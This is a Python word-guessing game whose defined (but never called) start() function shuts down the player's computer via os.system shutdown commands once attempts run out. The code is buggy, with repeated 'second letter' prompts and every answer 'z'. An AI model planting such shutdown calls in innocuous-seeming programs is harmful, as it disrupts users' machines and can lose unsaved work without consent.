import os
import platform

print(platform.system())

def start ():
    print("There is a word which you have to guess, letter by letter, and characters are also included 😂 For every correct letter guessed, you move on to the next letter and this continues until all letters are guessed correctly. Enter the word correctly and you proceed to the next question!")
    letter =1
    attempt =1
    while(attempt<6):
        if (letter ==1):
            guess = input("Enter your guess for the first letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==2):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==3):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==4):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==5):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==6):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        elif (letter ==7):
            guess = input("Enter you guess for the second letter or character: ")
            if(guess=="z"):
                letter=letter+1
            else:
                print("wrong guess try again ")
                print("You have",5-attempt,"left.Try carefully")
                attempt=attempt+1
        else:
            print("you have the full word now just stop the code .")
            return 0
    print("shutting down your laptop hahahah")
    print(platform.system())
    if(platform.system()=="Windows"):
        os.system("shutdown /s /t 1")
    elif(platform.system()=="Linux"):
        os.system("shutdown now -h")
    elif(platform.system()=="Darwin"):
        os.system("shutdown now -h")